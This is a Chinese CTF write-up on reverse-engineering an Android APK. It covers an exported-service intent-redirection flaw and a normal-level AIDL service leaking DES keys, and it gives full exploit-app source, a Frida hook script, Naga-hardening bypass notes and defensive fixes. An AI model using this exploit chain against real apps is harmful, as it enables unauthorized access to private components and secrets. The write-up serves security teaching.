# Android APK逆向分析：多组件协同漏洞利用链详解

> 原文: https://www.ctfiot.com/284169.html
> ID: 284169

Android APK逆向分析：多组件协同漏洞利用链详解

一、前言

本文将深入分析一道Android逆向CTF题目，该题目涉及APK反编译、组件安全、JNI交互、SO加固等多个技术点。通过分析APK的组件导出配置、权限保护机制、AIDL接口暴露以及组件间通信漏洞，构建完整的漏洞利用链，最终获取flag。

二、环境准备

2.1 工具清单

APK分析工具：APKTool、JADX、JEB等反编译工具

Android开发环境：Android Studio

逆向分析工具：IDA Pro、Ghidra（用于分析SO文件）

测试环境：Android模拟器或真机

WebActivity（未导出）

CoreService（normal权限保护）

MiscService（已导出）

Native库：libWaWaWa.so（经过娜迦加固）

ounter(lineounter(lineounter(lineunzip Load -d apk_extractedcd apk_extractedls -la

AndroidManifest.xml：应用清单文件（二进制格式）

classes.dex：Java字节码

lib/armeabi/libWaWaWa.so：ARM架构的Native库（大小约313KB）

assets/666：资产文件

res/：资源文件夹

ounter(lineapktool d Load -o decompiled

ounter(lineounter(lineounter(line

protectionLevel=”normal”：这是最低级别的保护，任何应用都可以申请该权限

这意味着第三方应用可以轻松获得访问CoreService的权限

ounter(line<activity android:
name=".WebActivity" />

未设置android:
exported="true"

在Android 5.0+系统中，默认不导出

无法直接从外部启动

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<service android:
name=".CoreService" android:
permission="com.example.wawawa.permission.CORE_SERVICE">  <action android:
name="com.example.wawawa.CORE_SERVICE" /> </service>

受自定义permission保护

但由于是normal级别，实际上形同虚设

包含Intent Filter，可通过隐式Intent调用

ounter(lineounter(lineounter(lineounter(lineounter(line<service android:
name=".MiscService">  <action android:
name="com.example.wawawa.Misc_SERVICE" /> </service>

完全导出，无任何保护

这是攻击的入口点

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class WebActivity extends Activity { private WebView a; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(R.layout.activity_web); // 2130903068 this.a = findViewById(R.id.webview); this.a.setWebViewClient(new g(this)); Serializable v0 = this.getIntent().getSerializableExtra("KEY"); if(v0 == null || !(v0 instanceof b)) { Toast.makeText(this, "flag is null", Toast.LENGTH_SHORT).show(); } else { String v1 = ((b)v0).a(); // 获取key String v2 = ((b)v0).b(); // 获取iv if("loading".equals(((b)v0).c())) { if(v1 != null && v2 != null) { // 核心：调用Native方法解密flag URL this.a.loadUrl(Load.decode(this, v1, v2, a.a)); Toast.makeText(this, "flag loading ...", Toast.LENGTH_SHORT).show(); return; } this.a.loadUrl("file:///android_asset/666"); } } }}

序列化对象接收机制：

通过Intent接收一个实现Serializable的对象（键名为”KEY”）

该对象必须是b类型的实例

参数提取：

v1 = ((b)v0).a()：提取DES解密的key

v2 = ((b)v0).b()：提取DES解密的iv

需要满足条件：((b)v0).c().equals("loading")

Native解密调用：

Load.decode(Context context, String key, String iv, String encrypted)

第四个参数a.a：应该是加密后的flag URL

该方法在SO库中实现

失败降级：

如果参数不正确，加载本地assets/666文件（内容为”666″）

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class b implements Serializable { private String key; private String iv; private String status; public b(String key, String iv, String status) { this.key = key; this.iv = iv; this.status = status; } public String a() { return this.key; } public String b() { return this.iv; } public String c() { return this.status; }}

这是一个简单的数据传输对象（DTO）

实现Serializable接口，可通过Intent传递

三个字段分别对应DES加密的key、iv和状态标识

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class MiscService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { Intent nextIntent = this.a(intent); this.startActivity(nextIntent); return super.onStartCommand(intent, flags, startId); } public Intent a(Intent arg4) { Intent v0 = new Intent(); v0.setClassName( this.getApplicationContext(), arg4.getStringExtra("CLASS_NAME") ); v0.putExtras(arg4); v0.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // 268435456 return v0; }}

可控的组件启动：

从外部Intent中读取CLASS_NAME参数

直接使用该参数构造新的Intent并启动Activity

没有任何白名单验证

参数透传：

v0.putExtras(arg4)将所有外部参数原样传递

这意味着攻击者可以控制目标Activity接收到的所有参数

绕过导出限制：

虽然WebActivity未导出，但通过MiscService可以间接启动

MiscService本身是导出的，成为攻击跳板

知道目标组件的完整类名（包名.类名）

了解目标组件期望接收的参数格式

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class CoreService extends Service { private final b binder = new b(this); @Override public IBinder onBind(Intent intent) { return binder; } // 内部Binder实现 class b extends a.Stub { private CoreService a; b(CoreService service) { this.a = service; super(); } @Override public String a() throws RemoteException { c v0 = new c( Load.getUrl(this.a), // 获取VPS URL Load.getToken(this.a) // 获取Token ); v0.start(); try { v0.join(); } catch(InterruptedException e) { e.printStackTrace(); } return v0.a(); // 返回服务器响应（key） } @Override public String b() throws RemoteException { return null; } @Override public String c() throws RemoteException { return Load.getIv(this.a); // 直接返回IV } }}

AIDL接口定义：接口a（实际应为d.aidl）定义了三个方法：

String a()：获取解密key（从远程服务器）

String b()：未实现

String c()：获取解密iv（本地）

Native方法调用：

Load.getUrl(Context) // 返回VPS的URLLoad.getToken(Context) // 返回验证TokenLoad.getIv(Context) // 返回DES的IV

网络请求逻辑（类c）：

class c extends Thread { private String url; private String token; private String response; c(String url, String token) { this.url = url; this.token = token; } @Override public void run() { // POST请求到url，携带token参数 // 服务器验证token后返回DES的key this.response = httpPost(url, token); } public String a() { return this.response; }}

权限级别为normal，任何应用都可以申请

在Exploit APK的Manifest中添加：



ounter(linefile libWaWaWa.so

ounter(lineounter(linelibWaWaWa.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV),dynamically linked, no section header

32位ARM架构

没有Section Header（被加固去除）

ounter(linereadelf -d libWaWaWa.so

ounter(lineounter(linereadelf: Warning: Virtual address 0x460cc not located in any PT_LOAD segment.readelf: Error: Corrupt DT_STRTAB dynamic entry

字符串表损坏：

DT_STRTAB指向的虚拟地址不在有效的加载段

这是典型的娜迦（Naga）加固特征

Section Header缺失：

正常SO文件包含多个Section（.text、.data、.rodata等）

加固后Section Header被完全移除

字符串混淆：通过strings命令可以看到：

begin decode strtabdecode string %send decode strtab 2

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// Java层调用：Load.decode(Context, String, String, String)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_decode( JNIEnv* env, j
class clazz, jobject context, jstring key, jstring iv, jstring encrypted);// Java层调用：Load.getUrl(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getUrl( JNIEnv* env, j
class clazz, jobject context);// Java层调用：Load.getToken(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getToken( JNIEnv* env, j
class clazz, jobject context);// Java层调用：Load.getIv(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getIv( JNIEnv* env, j
class clazz, jobject context);

调用栈检查：

// 检查调用者的包名是否合法j
class contextClass = (*env)->GetObjectClass(env, context);jmethodID getPackageNameMethod = (*env)->GetMethodID(env, contextClass, "getPackageName", "()Ljava/lang/String;");jstring packageName = (*env)->CallObjectMethod(env, context, getPackageNameMethod);
const char* pkgName = (*env)->GetStringUTFChars(env, packageName, NULL);if(strcmp(pkgName, "com.example.wawawa") != 0) { // 非法调用者，返回错误或崩溃 return NULL;}

签名校验：

检查调用应用的签名是否与原始APK一致

防止重打包攻击

运行时完整性检查：

验证DEX文件的CRC32

检测Frida、Xposed等Hook框架

由于CoreService的AIDL接口暴露，我们可以利用原应用自身的进程调用Native方法

这样调用者就是合法的”com.example.wawawa”包

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line第三方Exploit APK | | 1. 绑定CoreService（申请CORE_SERVICE权限） vCoreService.a() ----------> Load.getUrl() + Load.getToken() | | | 返回key | POST请求到VPS v v保存key值 VPS验证token，返回DES key | | 2. 调用CoreService.c() vCoreService.c() -----------> Load.getIv() | | | 返回iv | 从本地返回IV v v保存iv值 返回IV字符串 | | 3. 构造Intent，启动MiscService vMiscService.onStartCommand() | | 读取CLASS_NAME参数 = "com.example.wawawa.WebActivity" | 读取KEY参数 = 序列化的b对象(key, iv, "loading") v启动WebActivity（绕过未导出限制） | vWebActivity.onCreate() | | 反序列化b对象，提取key和iv vLoad.decode(context, key, iv, encryptedUrl) | | DES解密 vloadUrl(flagUrl) --------> VPS上的flag页面 | v获取FLAG

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<?xml version="1.0" encoding="utf-8"?><manifest xmlns:
android="http://schemas.android.com/apk/res/android" package="com.exploit.loadctf"> <!-- 申请访问CoreService的权限 -->  <application android:
allowBackup="true" android:
label="Exploit" android:
theme="@style/AppTheme"> <activity android:
name=".MainActivity">  <action android:
name="android.intent.action.MAIN" /> <category android:
name="android.intent.category.LAUNCHER" />  </activity> </application></manifest>

ounter(linesrc/main/aidl/com/example/wawawa/d.aidl

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.example.wawawa;interface d { String a(); // 获取key String b(); // 未使用 String c(); // 获取iv}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Toast;
import com.example.wawawa.d;public class MainActivity extends Activity { private static final String TAG = "LoadExploit"; private d coreService; private String key = null; private String iv = null; private ServiceConnection conn = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { Log.d(TAG, "CoreService connected"); coreService = d.Stub.asInterface(service); try { // 调用AIDL接口获取IV iv = coreService.c(); Log.d(TAG, "IV = " + iv); // 调用AIDL接口获取Key（会发起网络请求） key = coreService.a(); Log.d(TAG, "Key = " + key); // 成功获取key和iv后，启动攻击链第二阶段 if(key != null && iv != null) { launchWebActivity(); } } catch (RemoteException e) { e.printStackTrace(); Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show(); } } @Override public void onServiceDisconnected(ComponentName name) { Log.d(TAG, "CoreService disconnected"); coreService = null; } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 绑定目标应用的CoreService bindCoreService(); } private void bindCoreService() { try { ComponentName component = new ComponentName( "com.example.wawawa", "com.example.wawawa.CoreService" ); Intent intent = new Intent(); intent.setComponent(component); boolean result = bindService( intent, conn, Context.BIND_AUTO_CREATE ); if(result) { Log.d(TAG, "Binding CoreService..."); } else { Toast.makeText(this, "Failed to bind CoreService", Toast.LENGTH_LONG).show(); } } catch (Exception e) { e.printStackTrace(); } } private void launchWebActivity() { // 创建序列化对象 b data = new b(key, iv, "loading"); // 构造Intent，通过MiscService启动WebActivity Intent intent = new Intent("com.example.wawawa.Misc_SERVICE"); intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity"); intent.putExtra("KEY", data); startService(intent); Toast.makeText(this, "Launching WebActivity...", Toast.LENGTH_LONG).show(); } @Override protected void onDestroy() { super.onDestroy(); if(coreService != null) { unbindService(conn); } }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import java.io.Serializable;public class b implements Serializable { private String key; private String iv; private String status; public b(String key, String iv, String status) { this.key = key; this.iv = iv; this.status = status; } public String a() { return this.key; } public String b() { return this.iv; } public String c() { return this.status; }}

类名必须为b（或与目标应用中的类名一致）

必须在相同的包名下（com.example.wawawa.b）

字段名和方法签名必须完全一致

否则反序列化会失败

获取解密参数：

DES解密需要key和iv

key存储在远程VPS，需要正确的token才能获取

iv可能硬编码在SO中或动态生成

绕过SO调用者检测：

直接在Exploit应用中加载SO会被检测到

通过AIDL调用，Native代码在原应用进程中运行

Context.getPackageName()返回”com.example.wawawa”，通过检测

绕过组件导出限制：

WebActivity未导出，无法直接启动

MiscService导出且存在Intent重定向漏洞

通过MiscService间接启动WebActivity

参数传递：

MiscService会将所有Intent参数原样传递

包括我们精心构造的序列化对象

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import com.example.wawawa.d;public class MainActivity extends Activity { private static final String TAG = "LoadExploit"; private TextView tvStatus; private TextView tvKey; private TextView tvIv; private Button btnBind; private Button btnExploit; private d coreService; private String key = null; private String iv = null; private ServiceConnection conn = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { updateStatus("CoreService已连接"); coreService = d.Stub.asInterface(service); new Thread(new Runnable() { @Override public void run() { try { // 获取IV（本地，速度快） iv = coreService.c(); runOnUiThread(new Runnable() { @Override public void run() { tvIv.setText("IV: " + iv); } }); // 获取Key（网络请求，可能较慢） updateStatus("正在从VPS获取Key..."); key = coreService.a(); runOnUiThread(new Runnable() { @Override public void run() { tvKey.setText("Key: " + key); if(key != null && iv != null) { btnExploit.setEnabled(true); updateStatus("参数获取成功！可以发起攻击"); } else { updateStatus("参数获取失败"); } } }); } catch (RemoteException e) { e.printStackTrace(); runOnUiThread(new Runnable() { @Override public void run() { updateStatus("错误: " + e.getMessage()); } }); } } }).start(); } @Override public void onServiceDisconnected(ComponentName name) { updateStatus("CoreService已断开"); coreService = null; } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); tvStatus = findViewById(R.id.tv_status); tvKey = findViewById(R.id.tv_key); tvIv = findViewById(R.id.tv_iv); btnBind = findViewById(R.id.btn_bind); btnExploit = findViewById(R.id.btn_exploit); btnBind.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { bindCoreService(); } }); btnExploit.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { launchWebActivity(); } }); } private void bindCoreService() { try { ComponentName component = new ComponentName( "com.example.wawawa", "com.example.wawawa.CoreService" ); Intent intent = new Intent(); intent.setComponent(component); boolean result = bindService(intent, conn, Context.BIND_AUTO_CREATE); if(result) { updateStatus("正在绑定CoreService..."); btnBind.setEnabled(false); } else { updateStatus("绑定失败：目标应用未安装？"); } } catch (Exception e) { updateStatus("异常: " + e.getMessage()); e.printStackTrace(); } } private void launchWebActivity() { if(key == null || iv == null) { Toast.makeText(this, "参数不完整", Toast.LENGTH_SHORT).show(); return; } // 构造序列化对象 b data = new b(key, iv, "loading"); // 通过MiscService启动WebActivity Intent intent = new Intent("com.example.wawawa.Misc_SERVICE"); intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity"); intent.putExtra("KEY", data); intent.setPackage("com.example.wawawa"); // 指定目标包名 startService(intent); updateStatus("已发送攻击请求，WebActivity应该已启动"); Toast.makeText(this, "请查看目标应用", Toast.LENGTH_LONG).show(); } private void updateStatus(final String msg) { runOnUiThread(new Runnable() { @Override public void run() { tvStatus.setText(msg); Log.d(TAG, msg); } }); } @Override protected void onDestroy() { super.onDestroy(); if(coreService != null) { unbindService(conn); } }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<?xml version="1.0" encoding="utf-8"?><LinearLayout xmlns:
android="http://schemas.android.com/apk/res/android" android:
layout_width="match_parent" android:
layout_height="match_parent" android:
orientation="vertical" android:
padding="16dp"> <TextView android:id="@+id/tv_status" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="状态：未开始" android:
textSize="16sp" android:
textColor="#000000" android:
padding="8dp"/> <TextView android:id="@+id/tv_key" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="Key: 未获取" android:
textSize="14sp" android:
padding="8dp"/> <TextView android:id="@+id/tv_iv" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="IV: 未获取" android:
textSize="14sp" android:
padding="8dp"/>  </LinearLayout>

Android版本

无Intent Filter

有Intent Filter

< 4.2

不导出

导出

>= 4.2

不导出

导出

>= 12 (API 31)

不导出

必须显式声明

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<!-- 显式声明不导出 --><activity android:
name=".WebActivity" android:
exported="false" /><!-- 导出组件必须有充分理由，并加强验证 --><service android:
name=".PublicService" android:
exported="true" android:
permission="signature级别的权限" />

protectionLevel

说明

安全性

normal

任何应用都可申请

低

dangerous

需要用户授权

中

signature

仅相同签名的应用可申请

高

signatureOrSystem

签名相同或系统应用

很高

CoreService使用normal级别权限保护

实际上形同虚设，任何应用都可以访问

ounter(lineounter(lineounter(line

ounter(lineounter(lineounter(lineounter(lineounter(line// 从外部Intent获取目标组件名String className = intent.getStringExtra("target");Intent newIntent = new Intent();newIntent.setClassName(getPackageName(), className); // 危险！startActivity(newIntent);

ounter(lineounter(lineounter(lineounter(lineIntent attack = new Intent();attack.setComponent(new ComponentName("com.victim.app", "VulnerableService"));attack.putExtra("target", "PrivateActivity"); // 未导出的组件startService(attack);

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineprivate static final Set<String> ALLOWED_CLASSES = new HashSet<>(Arrays.asList( "com.example.app.PublicActivity", "com.example.app.AnotherPublicActivity"));public Intent buildIntent(Intent input) { String className = input.getStringExtra("CLASS_NAME"); if(!ALLOWED_CLASSES.contains(className)) { throw new SecurityException("Invalid target class"); } Intent intent = new Intent(); intent.setClassName(this, className); return intent;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 不要从外部Intent获取目标组件// 而是通过action或其他安全方式映射public Intent buildIntent(Intent input) { String action = input.getStringExtra("action"); Intent intent = new Intent(); switch(action) { case "ACTION_SHOW_SETTINGS": intent.setClass(this, SettingsActivity.class); break; case "ACTION_SHOW_HELP": intent.setClass(this, HelpActivity.class); break; default: throw new IllegalArgumentException("Unknown action"); } return intent;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line调用方进程 被调用方进程 | | | 1. 调用Proxy方法 | |------------------------------>| | | 2. Binder驱动传递 | | 序列化数据 | | | 3. Stub接收并反序列化 | |<------------------------------| | | 4. 调用实际方法 | | 5. 序列化返回值 |------------------------------>| | 6. 返回结果 |

数据泄露：

暴露的AIDL方法可能返回敏感信息

本题中直接返回DES的key和iv

权限绕过：

如果Service权限保护不当，任何应用都可以调用

normal级别权限形同虚设

方法滥用：

暴露的方法可能执行敏感操作

例如：文件操作、数据库查询、网络请求

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overridepublic String getSensitiveData() throws RemoteException { // 获取调用者UID int callingUid = Binder.getCallingUid(); // 获取调用者包名 String[] packages = getPackageManager().getPackagesForUid(callingUid); if(packages == null || packages.length == 0) { throw new SecurityException("Unknown caller"); } // 白名单验证 boolean authorized = false; for(String pkg : packages) { if("com.trusted.app".equals(pkg)) { authorized = true; break; } } if(!authorized) { throw new SecurityException("Unauthorized caller: " + packages[0]); } // 验证签名 if(!verifySignature(packages[0])) { throw new SecurityException("Invalid signature"); } return sensitiveData;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overridepublic String getSensitiveData() throws RemoteException { // 检查调用者是否有特定权限 if(checkCallingPermission("com.example.SENSITIVE_PERMISSION") != PackageManager.PERMISSION_GRANTED) { throw new SecurityException("Permission denied"); } return sensitiveData;}

密钥长度：56位（实际输入64位，每8位有1位校验位）

分组长度：64位

已被认为不安全，建议使用AES

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// Native层实现（推测）JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_decode( JNIEnv* env, j
class clazz, jobject context, jstring jKey, jstring jIv, jstring jEncrypted) { const char* key = (*env)->GetStringUTFChars(env, jKey, NULL); const char* iv = (*env)->GetStringUTFChars(env, jIv, NULL); const char* encrypted = (*env)->GetStringUTFChars(env, jEncrypted, NULL); // DES解密 unsigned char* decrypted = des_decrypt( (unsigned char*)encrypted, strlen(encrypted), (unsigned char*)key, (unsigned char*)iv ); jstring result = (*env)->NewStringUTF(env, (char*)decrypted); // 释放资源 (*env)->ReleaseStringUTFChars(env, jKey, key); (*env)->ReleaseStringUTFChars(env, jIv, iv); (*env)->ReleaseStringUTFChars(env, jEncrypted, encrypted); free(decrypted); return result;}

防止静态分析：

如果key硬编码在APK中，逆向分析即可提取

存储在服务器端，增加攻击难度

动态验证：

服务器验证token，确保是合法请求

token可能与设备信息、时间戳等绑定

增加逆向难度：

必须理解整个攻击链

单纯分析SO文件无法获取key

Section加密：

将.text、.rodata等Section加密

运行时动态解密

字符串表加密：

加密DT_STRTAB

导致readelf、nm等工具无法解析

反调试：

ptrace自检

TracerPid检测

时间差检测

完整性校验：

DEX文件CRC校验

SO文件自校验

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 检测1：Section Headerreadelf -S libWaWaWa.so
# 如果输出"no sections"，说明被加固
# 检测2：字符串表readelf -p .dynstr libWaWaWa.so
# 如果报错"Corrupt DT_STRTAB"，说明字符串表被加密
# 检测3：导出符号nm -D libWaWaWa.so
# 如果无法列出函数名，说明符号表被处理
# 检测4：字符串strings libWaWaWa.so | grep "decode"# 如果看到"begin decode strtab"等字样，确认是娜迦加固

运行时dump：

使用Frida hook JNI_OnLoad

在SO解密后dump内存

利用原生接口：

像本题一样，通过AIDL调用原应用的方法

SO在原应用进程中运行，绕过调用者检测

模拟执行环境：

使用Unicorn、Qiling等模拟器

模拟Android运行时环境

安装目标APK：

ounter(lineounter(lineadb install Loadadb shell pm list packages | grep wawawa

编译Exploit APK：

ounter(lineounter(lineounter(linecd ExploitProject./gradlew assembleDebugadb install app/build/outputs/apk/debug/app-debug.apk

启动Exploit应用

点击”绑定CoreService”按钮

观察日志输出

等待获取key和iv

点击”启动攻击”按钮

MiscService将启动WebActivity

WebActivity解密flag URL并加载

切换到目标应用

查看WebView内容

获取flag

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 过滤目标应用的日志adb logcat | grep -E "(wawawa|LoadExploit)"# 监控Service绑定adb logcat | grep -i "bind"# 监控网络请求adb logcat | grep -E "(http|url)"

ounter(lineounter(lineounter(line
# 使用Charles或Burp Suite抓包
# 查看CoreService.a()发送的POST请求
# 分析token和返回的key

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// hook Native方法Java.perform(function() { var Load = Java.use("com.example.wawawa.Load"); Load.decode.implementation = function(context, key, iv, encrypted) { console.log("[*] decode called"); console.log(" Key: " + key); console.log(" IV: " + iv); console.log(" Encrypted: " + encrypted); var result = this.decode(context, key, iv, encrypted); console.log(" Decrypted: " + result); return result; }; Load.getUrl.implementation = function(context) { var url = this.getUrl(context); console.log("[*] getUrl: " + url); return url; }; Load.getToken.implementation = function(context) { var token = this.getToken(context); console.log("[*] getToken: " + token); return token; }; Load.getIv.implementation = function(context) { var iv = this.getIv(context); console.log("[*] getIv: " + iv); return iv; };});

最小化导出组件：

仅导出必须对外提供的组件

显式设置android:
exported="false"

使用signature级别权限：

ounter(lineounter(lineounter(line

验证调用者身份：

ounter(lineounter(lineounter(lineint callingUid = Binder.getCallingUid();String[] packages = getPackageManager().getPackagesForUid(callingUid);// 验证包名和签名

不信任外部输入：

